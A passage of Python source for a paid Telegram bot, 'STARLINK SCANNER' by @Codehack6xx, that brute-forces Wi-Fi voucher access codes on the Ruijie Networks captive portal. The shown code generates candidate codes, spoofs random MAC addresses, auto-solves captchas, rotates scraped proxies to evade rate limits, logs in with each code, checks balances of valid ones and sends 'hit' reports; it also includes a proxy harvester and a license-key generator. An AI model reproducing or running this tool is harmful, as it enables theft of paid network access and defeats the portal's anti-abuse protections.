            src_icon = "🌐" if src == "proxy" else ("📡" if src == "direct" else "✅")
            hit_lines.append(f"  🎁  <code>{c}</code>\n       {balance}  {src_icon}")

        hit_str = "\n\n".join(hit_lines) if hit_lines else "  💤  No hits"

        final_text = (
            f"{BOT_TAGLINE}\n"
            f"🥺 <b>SCANNER STOPPED</b> 🥺\n"
            f"🍼  Thank by @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⏱️  Runtime   {ARROW}  <code>{runtime}</code>\n"
            f"  📊  Tried     {ARROW}  <b>{stats['tried']:,}</b>\n"
            f"  🎉  Hits      {ARROW}  <b>{stats['hits']}</b>\n"
            f"  ⚡  Speed     {ARROW}  {speed_cpm:.1f} c/m\n"
            f"  🔀  Proxies   {ARROW}  {proxy_active}/{proxy_total}\n"
            f"{DIV}\n"
            f"  🎁  <b>ALL HIT CODES</b>  🎁\n\n"
            f"{hit_str}\n"
            f"{DIV}\n"
            f"  💬  Owner : @Codehack6xx"
        )
        if ud['dash_msg_id']:
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=ud['dash_msg_id'],
                    text=final_text, parse_mode=ParseMode.HTML
                )
            except Exception:
                await context.bot.send_message(chat_id=user_id, text=final_text, parse_mode=ParseMode.HTML)
        else:
            await context.bot.send_message(chat_id=user_id, text=final_text, parse_mode=ParseMode.HTML)

        await auto_retry_pending(ud, context, user_id)

        if ud['valid_codes']:
            try:
                import datetime as _dt
                timestamp = _dt.datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f"hits_{user_id}_{timestamp}.txt"
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(f"=== HIT CODES REPORT ===\n")
                    f.write(f"Owner   : @Codehack6xx\n")
                    f.write(f"User ID : {user_id}\n")
                    f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Runtime : {runtime}\n")
                    f.write(f"Tried   : {stats['tried']:,}\n")
                    f.write(f"Hits    : {stats['hits']}\n")
                    f.write(f"Speed   : {speed_cpm:.1f} c/m\n")
                    f.write(f"{'='*40}\n\n")
                    for item in ud['valid_codes']:
                        src = item.get('source', '...')
                        f.write(f"{item['code']} | {item.get('balance_str', 'N/A')} | {src}\n")
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=user_id, document=f,
                        caption=f"🎁 Hit Codes Report\n"
                                f"✅ Total: {len(ud['valid_codes'])} hits\n"
                                f"🍼 By @Codehack6xx"
                    )
                try:
                    os.remove(filename)
                except Exception:
                    pass
            except Exception as e:
                print(f"[HitFile] Error sending hit codes file: {e}")

        ud['stop_event'].clear()
        ud['dash_msg_id'] = None
        ud['task'] = None

# ==================== PROXY CHECKER ====================
async def fetch_proxy_list(url: str) -> list:
    proxies = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=15) as resp:
                if resp.status == 200:
                    content_type = resp.headers.get('content-type', '')
                    if 'application/json' in content_type:
                        data = await resp.json()
                        items = None
                        if isinstance(data, list):
                            items = data
                        elif isinstance(data, dict):
                            for key in ('data', 'items', 'results'):
                                if key in data and isinstance(data[key], list):
                                    items = data[key]
                                    break
                        if items:
                            for item in items:
                                if isinstance(item, dict) and 'ip' in item and 'port' in item:
                                    ip = str(item['ip']).strip()
                                    port = str(item['port']).strip()
                                    if ip and port:
                                        proxy = f"http://{ip}:{port}"
                                        proxies.append(proxy)
                    else:
                        text = await resp.text()
                        for line in text.splitlines():
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if not line.startswith(('http://', 'https://')):
                                    line = 'http://' + line
                                proxies.append(line)
    except Exception as e:
        print(f"Error fetching {url}: {e}")
    return proxies

async def check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id):
    async with semaphore:
        if stop_event.is_set():
            return None
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            u = urlparse(portal_url)
            query = parse_qs(u.query)
            mac = generate_random_mac()
            query['mac'] = [mac]
            spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))
            async with session.get(spoofed_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r2:
                body = await r2.text()
                match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
                if match:
                    final_url = urljoin(spoofed_url, match.group(1))
                    async with session.get(final_url, headers=headers, timeout=5, ssl=False, proxy=proxy) as r3:
                        final_url = str(r3.url)
                else:
                    final_url = str(r2.url)
                parsed_query = parse_qs(urlparse(final_url).query)
                sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
                if sid:
                    return proxy
        except Exception:
            pass
        return None

async def run_proxy_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int, sources: list = None):
    ud = get_user_data(user_id)
    stop_event = asyncio.Event()
    user_proxy_checks[user_id] = {'stop_event': stop_event, 'msg_id': None, 'task': asyncio.current_task()}
    if sources is None:
        sources = PROXY_SOURCES

    try:
        init_msg = await context.bot.send_message(
            chat_id,
            f"🔍 <b>PROXY CHECKER</b> 🔍\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⏳  Downloading proxy list...",
            parse_mode=ParseMode.HTML
        )
        user_proxy_checks[user_id]['msg_id'] = init_msg.message_id
    except Exception as e:
        print(f"[ProxyCheck] Cannot send init msg: {e}")
        return
    progress_msg_id = init_msg.message_id

    stop_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🛑  STOP & SAVE  🛑", callback_data="proxy_check_stop")]
    ])

    all_proxies = []
    for i, url in enumerate(sources, 1):
        if stop_event.is_set():
            break
        p = await fetch_proxy_list(url)
        print(f"Source {i}: {len(p)} proxies")
        all_proxies.extend(p)
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=(
                    f"🔍 <b>PROXY CHECKER</b> 🔍\n"
                    f"🍼  By @Codehack6xx\n"
                    f"{DIV}\n"
                    f"  📥  Downloading...\n"
                    f"  🌐  Source   {ARROW}  {i}/{len(sources)}\n"
                    f"  📊  Current  {ARROW}  {len(p)}\n"
                    f"  🎯  Total    {ARROW}  {len(all_proxies)}\n"
                    f"{DIV}"
                ),
                reply_markup=stop_kb,
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass

    seen = set()
    unique_proxies = []
    for p in all_proxies:
        if p not in seen:
            seen.add(p)
            unique_proxies.append(p)

    if not unique_proxies:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=progress_msg_id,
                text=f"❌ <b>No proxies found in sources.</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        user_proxy_checks.pop(user_id, None)
        return

    total = len(unique_proxies)
    CONCURRENCY = 100
    semaphore = asyncio.Semaphore(CONCURRENCY)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    timeout = aiohttp.ClientTimeout(total=5)
    good_proxies = []
    checked = 0
    last_update = time.time()
    start_time = time.time()

    portal_url = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=c4b25b4e24cf&gw_sn=H1TC2LY000735&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.170&mac=5e:21:ad:5d:13:0d&slot_num=14&nasip=192.168.1.71&ssid=PAING&ustate=0&mac_req=1&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C002&chap_challenge=%5C022%5C076%5C030%5C160%5C346%5C277%5C107%5C257%5C116%5C227%5C172%5C334%5C045%5C220%5C357%5C371&v=2"

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for proxy in unique_proxies:
            task = asyncio.create_task(check_proxy_working(session, proxy, portal_url, semaphore, stop_event, user_id))
            tasks.append(task)

        for completed_task in asyncio.as_completed(tasks):
            if stop_event.is_set():
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            try:
                result = await completed_task
            except Exception:
                result = None
            if result:
                good_proxies.append(result)
            checked += 1

            now = time.time()
            if checked % 50 == 0 or now - last_update > 2 or checked == total:
                last_update = now
                pct = (checked / total) * 100 if total else 0
                elapsed = now - start_time
                speed = checked / elapsed if elapsed > 0 else 0
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id, message_id=progress_msg_id,
                        text=(
                            f"🔍 <b>PROXY CHECKER</b> 🔍\n"
                            f"🍼  By @Codehack6xx\n"
                            f"{DIV}\n"
                            f"  📊  Progress  {ARROW}  {pct:.0f}%\n"
                            f"  🔎  Checked   {ARROW}  {checked:,}/{total:,}\n"
                            f"  ✅  Working   {ARROW}  <b>{len(good_proxies)}</b>\n"
                            f"  ❌  Dead      {ARROW}  {checked - len(good_proxies)}\n"
                            f"  ⚡  Speed     {ARROW}  {speed:.1f} p/s\n"
                            f"{DIV}\n"
                            f"  💾  Stop နှိပ်ရင် ရထားတာတွေ save လုပ်ပါမည်။"
                        ),
                        reply_markup=stop_kb,
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass

    pm = get_proxy_manager()
    added = pm.add_proxies(good_proxies)

    if stop_event.is_set():
        final_text = (
            f"🛑 <b>PROXY CHECK STOPPED</b>\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ✅  Found   {ARROW}  {len(good_proxies)}\n"
            f"  📥  Added   {ARROW}  {added} new\n"
            f"  💾  Saved to proxies.txt\n"
            f"{DIV}"
        )
    else:
        final_text = (
            f"✅ <b>PROXY CHECK DONE</b> ✅\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  🎯  Total    {ARROW}  {total:,}\n"
            f"  ✅  Working  {ARROW}  <b>{len(good_proxies)}</b>\n"
            f"  📥  Added    {ARROW}  {added} new\n"
            f"  💾  Saved to proxies.txt\n"
            f"{DIV}\n"
            f"  🎉  Complete!"
        )

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=progress_msg_id,
            text=final_text, parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

    if good_proxies:
        try:
            with open("good_proxies_temp.txt", "w") as f:
                for p in good_proxies:
                    f.write(p + "\n")
            with open("good_proxies_temp.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id, f,
                    caption=f"✅ Working proxies: {len(good_proxies)}/{total}\n🍼 By @Codehack6xx"
                )
        except Exception:
            pass
    user_proxy_checks.pop(user_id, None)

# ==================== MANUAL BALANCE ====================
def split_codes(raw: str, expected_len: int = None) -> list:
    cleaned = re.sub(r'[\s,;|]+', '\n', raw.strip())
    parts = [p.strip() for p in cleaned.split('\n') if p.strip()]
    codes = []
    seen = set()
    for p in parts:
        c = re.sub(r'[^A-Za-z0-9]', '', p)
        if not c:
            continue
        if expected_len is not None and len(c) != expected_len:
            continue
        if c not in seen:
            seen.add(c)
            codes.append(c)
    return codes

def get_manual_balance_state(user_id: int):
    if user_id not in user_manual_balance:
        user_manual_balance[user_id] = {
            'mode': 'num6',
            'code_len': 6,
            'state': None,
            'codes': [],
            'results': [],
            'running': False,
            'stop_event': asyncio.Event(),
            'msg_id': None,
            'task': None,
            'lock': asyncio.Lock(),
        }
    return user_manual_balance[user_id]

async def _process_one_code(code, st, ud, user_id, login_url, captcha_base_url, verify_url, headers, counter):
    pm = get_proxy_manager()
    token = None
    balance_str = "❌ failed"
    source = "❌"
    got_limit = False

    for attempt in range(3):
        if st['stop_event'].is_set():
            break
        proxy = await pm.get_next()
        if not proxy:
            break
        try:
            connector = create_connector_for_proxy(proxy)
            async with aiohttp.ClientSession(
                connector=connector,
                connector_owner=True,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as session:
                sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                if not sid:
                    await pm.mark_bad(proxy)
                    continue

                captcha_url = f"{captcha_base_url}?sessionId={sid}"
                auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
                if not auth_code or len(auth_code) < 2:
                    continue

                v_payload = {"sessionId": sid, "authCode": auth_code}
                async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=6) as v_resp:
                    if v_resp.status != 200:
                        continue
                    v_data = await v_resp.json()
                    if not v_data.get("success"):
                        continue

                    l_payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
                    async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=8) as l_resp:
                        l_text = await l_resp.text()
                        l_lower = l_text.lower()

                        if '"success":true' in l_lower:
                            token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                            if token_match:
                                token = token_match.group(1)
                                pm.mark_good(proxy)
                                break
                            else:
                                balance_str = "❌ no token"
                                break
                        elif "expired" in l_lower:
                            balance_str = "🥺 expired"
                            break
                        elif "request limited" in l_lower:
                            got_limit = True
                            continue
                        elif "exceeds the limit" in l_lower or "limit" in l_lower:
                            got_limit = True
                            continue
                        else:
                            balance_str = "❌ invalid"
                            break
        except Exception:
            try:
                await pm.mark_bad(proxy)
            except Exception:
                pass
            continue

    if token:
        bal_result = None
        chosen = await pm.get_next()
        if chosen:
            for retry in range(3):
                ok, res = await fetch_balance_with_proxy(token, chosen, timeout=3)
                if ok:
                    bal_result = res
                    source = "proxy"
                    pm.mark_good(chosen)
                    break
            if bal_result is None:
                await pm.mark_bad(chosen)
        if bal_result is None:
            ok, res = await fetch_balance_direct(token, timeout=5)
            bal_result = res if ok else f"❌ {res}"
            source = "direct"
        balance_str = bal_result
    elif got_limit:
        balance_str = "⚠️ limit"
        source = "limit"

    async with st['lock']:
        if source == "proxy":
            counter['proxy'] += 1
        elif source == "direct":
            counter['direct'] += 1
        elif source == "limit":
            counter['limit'] += 1
        else:
            counter['failed'] += 1
        counter['done'] += 1

    return {'code': code, 'balance': balance_str, 'source': source}

async def run_manual_balance_check(context: ContextTypes.DEFAULT_TYPE, chat_id: int, user_id: int):
    st = get_manual_balance_state(user_id)
    st['running'] = True
    st['stop_event'].clear()
    st['results'] = []

    codes = st['codes']
    total = len(codes)
    if total == 0:
        try:
            await context.bot.send_message(
                chat_id,
                "❌ <b>Code list is empty.</b>",
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        st['running'] = False
        return

    ud = get_user_data(user_id)
    portal_url = ud.get('portal_url')
    if not portal_url:
        await context.bot.send_message(
            chat_id,
            "❌ <b>Portal URL missing.</b>\n\n  💡  Update Portal first.",
            parse_mode=ParseMode.HTML
        )
        st['running'] = False
        return

    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    try:
        status_msg = await context.bot.send_message(
            chat_id,
            f"💳 <b>MANUAL BALANCE</b> 💳\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  ⚙️  Mode        {ARROW}  {st['mode']} ({st['code_len']} digit)\n"
            f"  📋  Total       {ARROW}  {total}\n"
            f"  🔀  Proxies     {ARROW}  {proxy_active}/{proxy_total}\n"
            f"  ⚡  Concurrency {ARROW}  {MANUAL_CONCURRENCY}\n"
            f"{DIV}\n"
            f"  ⏳  Starting...",
            parse_mode=ParseMode.HTML
        )
        st['msg_id'] = status_msg.message_id
    except Exception as e:
        print(f"[ManualBalance] Cannot send msg: {e}")
        st['running'] = False
        return

    counter = {'done': 0, 'proxy': 0, 'direct': 0, 'limit': 0, 'failed': 0}
    results = []
    last_edit = time.time()
    sem = asyncio.Semaphore(MANUAL_CONCURRENCY)
    start_time = time.time()

    async def _bounded(code):
        async with sem:
            if st['stop_event'].is_set():
                return None
            res = await _process_one_code(code, st, ud, user_id,
                                          login_url, captcha_base_url, verify_url,
                                          headers, counter)
            nonlocal last_edit
            now = time.time()
            if counter['done'] == total or now - last_edit > 1.5 or counter['done'] % 3 == 0:
                last_edit = now
                pct = (counter['done'] / total) * 100 if total else 0
                try:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=st['msg_id'],
                        text=(
                            f"💳 <b>MANUAL BALANCE</b> 💳\n"
                            f"🍼  By @Codehack6xx\n"
                            f"{DIV}\n"
                            f"  ⚙️  Mode        {ARROW}  {st['mode']} ({st['code_len']} digit)\n"
                            f"  📊  Progress    {ARROW}  {pct:.0f}%\n"
                            f"  🔎  Checked     {ARROW}  {counter['done']}/{total}\n"
                            f"{DIV}\n"
                            f"  🌐  Proxy hits  {ARROW}  <b>{counter['proxy']}</b>\n"
                            f"  📡  Direct hits {ARROW}  <b>{counter['direct']}</b>\n"
                            f"  ⚠️  Limited     {ARROW}  {counter['limit']}\n"
                            f"  ❌  Failed      {ARROW}  {counter['failed']}\n"
                            f"{DIV}\n"
                            f"  🎯  Current     {ARROW}  <code>{code}</code>"
                        ),
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
            return res

    task_list = [asyncio.create_task(_bounded(c)) for c in codes]
    for t in asyncio.as_completed(task_list):
        if st['stop_event'].is_set():
            for tt in task_list:
                if not tt.done():
                    tt.cancel()
            break
        try:
            r = await t
            if r:
                results.append(r)
        except Exception:
            pass

    st['results'] = results
    st['running'] = False
    elapsed = time.time() - start_time
    speed = counter['done'] / elapsed if elapsed > 0 else 0

    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=st['msg_id'],
            text=(
                f"🎉 <b>MANUAL BALANCE DONE</b> 🎉\n"
                f"🍼  By @Codehack6xx\n"
                f"{DIV}\n"
                f"  ⚙️  Mode        {ARROW}  {st['mode']} ({st['code_len']} digit)\n"
                f"  📋  Total       {ARROW}  {total}\n"
                f"  ⚡  Speed       {ARROW}  {speed:.1f} c/s\n"
                f"{DIV}\n"
                f"  🌐  Proxy hits  {ARROW}  <b>{counter['proxy']}</b>  ✅\n"
                f"  📡  Direct hits {ARROW}  <b>{counter['direct']}</b>  ✅\n"
                f"  ⚠️  Limited     {ARROW}  {counter['limit']}\n"
                f"  ❌  Failed      {ARROW}  {counter['failed']}\n"
                f"{DIV}\n"
                f"  🎁  Report sent below..."
            ),
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

    if results:
        try:
            import datetime as _dt
            ts = _dt.datetime.now().strftime('%Y%m%d_%H%M%S')
            fname = f"manual_balance_{user_id}_{ts}.txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(f"=== MANUAL BALANCE REPORT ===\n")
                f.write(f"Owner   : @Codehack6xx\n")
                f.write(f"User ID : {user_id}\n")
                f.write(f"Date    : {_dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Mode    : {st['mode']} ({st['code_len']} digit)\n")
                f.write(f"Total   : {total}\n")
                f.write(f"Proxy   : {counter['proxy']}\n")
                f.write(f"Direct  : {counter['direct']}\n")
                f.write(f"Limited : {counter['limit']}\n")
                f.write(f"Failed  : {counter['failed']}\n")
                f.write(f"{'*'*40}\n\n")
                for r in results:
                    f.write(f"{r['code']} | {r['balance']} | {r['source']}\n")
            with open(fname, 'rb') as f:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=f,
                    caption=f"💳 Manual Balance Report\n"
                            f"🌐 {counter['proxy']} | 📡 {counter['direct']} | "
                            f"⚠️ {counter['limit']} | ❌ {counter['failed']}\n"
                            f"🍼 By @Codehack6xx"
                )
            try:
                os.remove(fname)
            except Exception:
                pass
        except Exception as e:
            print(f"[ManualBalance] File send error: {e}")

# ==================== KEY GENERATOR SCRIPT FUNCTION ====================
def generate_new_key_cli():
    print("="*50)
    print("  KEY GENERATOR TOOL (Run via python nyein.py gen)")
    print("="*50)
    try:
        days = int(input("Enter validity days (e.g., 30): ").strip())
    except:
        days = 30
    new_key, expiry = generate_key_with_expiry(days)
    print("\n" + "="*50)
    print(f" ✅ SUCCESSFULLY GENERATED KEY!")
    print(f" KEY    : {new_key}")
    print(f" EXPIRES: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*50)

# ==================== KEYBOARDS & HANDLERS ====================
def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(text="🌐  Portal", callback_data="btn_update_portal"),
         InlineKeyboardButton(text="⚙️  Mode", callback_data="btn_mode_menu")],
        [InlineKeyboardButton(text="🔀  Proxies", callback_data="btn_add_proxies"),
         InlineKeyboardButton(text="👷  Workers", callback_data="btn_set_workers")],
        [InlineKeyboardButton(text="🔍  Proxy Check", callback_data="btn_proxy_checker"),
         InlineKeyboardButton(text="💳  Balance", callback_data="btn_manual_balance")],
        [InlineKeyboardButton(text="🚀  START SCANNER  🚀", callback_data="btn_start_scanner")]
    ])

def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            if update.effective_message:
                await update.effective_message.reply_text(
                    "⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ\n\n"
                    "💬 အသုံးပြုချင်ပါက telegram "
                    "@Codehack6xx ဆီမှာ ၀ယ်ယူပါ\n"
                    "ချစ်ရင်နို့ပေးကိုင်လေဗျာ🥺",
                    parse_mode=ParseMode.HTML
                )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def build_menu_text(ud):
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    status_icon = "🟢" if proxy_active > 0 else "🔴"
    return (
        f"⚡ <b>STARLINK SCANNER</b> ⚡\n"
        f"🍼  @Codehack6xx\n"
        f"👑  By <b>@Codehack6xx</b>\n"
        f"{DIV_LONG}\n"
        f"  ⚙️  Mode     {ARROW}  <code>{ud['mode']}</code>\n"
        f"  👷  Workers  {ARROW}  <code>{ud['num_workers']}</code>\n"
        f"  🔀  Proxies  {ARROW}  <code>{proxy_active}/{proxy_total}</code>\n"
        f"  👑  Status   {ARROW}  {status_icon} Ready\n"
        f"{DIV_LONG}\n"
        f"  💫  ရွေးချယ်လိုက်ပါ..."
    )

@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = None
    msg = await update.message.reply_text(
        build_menu_text(ud),
        reply_markup=get_main_menu_markup(),
        parse_mode=ParseMode.HTML
    )
    ud['menu_msg_id'] = msg.message_id

@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = 'waiting_for_proxy_text'
    ud['menu_msg_id'] = update.effective_message.message_id
    await update.message.reply_text(
        f"📥 <b>ADD PROXIES</b> 📥\n"
        f"🍼  By @Codehack6xx\n"
        f"{DIV}\n"
        f"  💫  Proxy များကို ယခုပို့ပါ\n"
        f"  📝  တစ်ကြောင်းလျှင် တစ်ခုစီ\n"
        f"{DIV}\n"
        f"  💡  Format:\n"
        f"     <code>123.45.67.89:8080</code>\n"
        f"     <code>socks5://user:pass@host:1080</code>",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    stopped_something = False
    if ud['task'] and not ud['task'].done():
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        ud['task'].cancel()
        stopped_something = True
    pc = user_proxy_checks.get(user_id)
    if pc and pc.get('stop_event'):
        pc['stop_event'].set()
        if pc.get('task') and not pc['task'].done():
            try:
                pc['task'].cancel()
            except Exception:
                pass
        stopped_something = True
    st = user_manual_balance.get(user_id)
    if st and st.get('running'):
        st['stop_event'].set()
        if st.get('task') and not st['task'].done():
            try:
                st['task'].cancel()
            except Exception:
                pass
        stopped_something = True
    if stopped_something:
        await update.message.reply_text(
            f"🛑 <b>Stopped immediately.</b>\n🍼 By @Codehack6xx",
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            f"ℹ️ <b>Nothing is running.</b>\n🍼 By @Codehack6xx",
            parse_mode=ParseMode.HTML
        )

@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    data = query.data

    if data == "btn_update_portal":
        ud['state'] = 'waiting_for_portal_url'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"🌐 <b>UPDATE PORTAL</b> 🌐\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  💫  Portal URL ကို ပို့ပေးပါ။\n"
            f"  📝  ဥပမာ - <code>https://...</code>",
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_mode_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔢 6", callback_data="set_mode_num6"),
             InlineKeyboardButton(text="🔢 7", callback_data="set_mode_num7"),
             InlineKeyboardButton(text="🔢 8", callback_data="set_mode_num8"),
             InlineKeyboardButton(text="🔢 9", callback_data="set_mode_num9")],
            [InlineKeyboardButton(text="🔤 Abc 6", callback_data="set_mode_abc6")],
            [InlineKeyboardButton(text="🎲 Mix 6", callback_data="set_mode_mix6"),
             InlineKeyboardButton(text="🎲 Mix 7", callback_data="set_mode_mix7")],
            [InlineKeyboardButton(text="🎲 Mix 8", callback_data="set_mode_mix8"),
             InlineKeyboardButton(text="🎲 Mix 9", callback_data="set_mode_mix9")],
            [InlineKeyboardButton(text="⭐ Custom Start", callback_data="set_mode_custom")],
            [InlineKeyboardButton(text="⬅️  Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            f"⚙️ <b>CHOOSE MODE</b> ⚙️\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  🔢  Number Mode\n"
            f"  🔤  Abc Mode\n"
            f"  🎲  Mix Mode\n"
            f"  ⭐  Custom Mode\n"
            f"{DIV}\n"
            f"  💫  ရွေးချယ်လိုက်ပါ...",
            reply_markup=keyboard,
            parse_mode=ParseMode.HTML
        )

    elif data.startswith("set_mode_"):
        selected_mode = data.split("set_mode_")[1]
        if selected_mode == "num6":
            ud['mode'] = "num6"; ud['char_set'] = "012345678"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "num7":
            ud['mode'] = "num7"; ud['char_set'] = "012345678"; ud['code_len'] = 7; ud['start_digit'] = None
        elif selected_mode == "num8":
            ud['mode'] = "num8"; ud['char_set'] = "012345678"; ud['code_len'] = 8; ud['start_digit'] = None
        elif selected_mode == "num9":
            ud['mode'] = "num9"; ud['char_set'] = "012345678"; ud['code_len'] = 9; ud['start_digit'] = None
        elif selected_mode == "abc6":
            ud['mode'] = "abc6"; ud['char_set'] = "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "mix6":
            ud['mode'] = "mix6"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 6; ud['start_digit'] = None
        elif selected_mode == "mix7":
            ud['mode'] = "mix7"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 7; ud['start_digit'] = None
        elif selected_mode == "mix8":
            ud['mode'] = "mix8"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 8; ud['start_digit'] = None
        elif selected_mode == "mix9":
            ud['mode'] = "mix9"; ud['char_set'] = "2345678" + "abcdefghijkmnpqrstuvwxyz"; ud['code_len'] = 9; ud['start_digit'] = None
        elif selected_mode == "custom":
            ud['mode'] = "custom"; ud['char_set'] = "012345678"; ud['code_len'] = 6
            ud['state'] = 'waiting_for_digit'
            ud['menu_msg_id'] = query.message.message_id
            await query.message.edit_text(
                f"⭐ <b>CUSTOM START</b> ⭐\n"
                f"🍼  By @Codehack6xx\n"
                f"{DIV}\n"
                f"  🔢  Start Digit ကို ပို့ပေးပါ။\n"
                f"  📝  ဂဏန်းတစ်လုံးသာ (0-8)\n"
                f"{DIV}",
                parse_mode=ParseMode.HTML
            )
            return
        await query.message.edit_text(
            build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_back_main":
        await query.message.edit_text(
            build_menu_text(ud),
            reply_markup=get_main_menu_markup(),
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_add_proxies":
        ud['state'] = 'waiting_for_proxy_text'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"📥 <b>ADD PROXIES</b> 📥\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
            f"  💫  Proxy များကို ယခုပို့ပါ\n"
            f"  📝  တစ်ကြောင်းလျှင် တစ်ခုစီ\n"
            f"{DIV}\n"
            f"  💡  Format:\n"
            f"     <code>123.45.67.89:8080</code>\n"
            f"     <code>socks5://user:pass@host:1080</code>\n"
            f"     <code>socks4://host:1080</code>",
            parse_mode=ParseMode.HTML
        )

    elif data == "btn_proxy_checker":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(text="🔍  Auto Check", callback_data="proxy_check_auto")],
            [InlineKeyboardButton(text="🔗  Manual URL", callback_data="proxy_check_manual_url")],
            [InlineKeyboardButton(text="🗑️  Clear File", callback_data="proxy_clear_file")],
            [InlineKeyboardButton(text="⬅️  Back", callback_data="btn_back_main")]
        ])
        await query.message.edit_text(
            f"🔍 <b>PROXY CHECKER</b> 🔍\n"
            f"🍼  By @Codehack6xx\n"
            f"{DIV}\n"
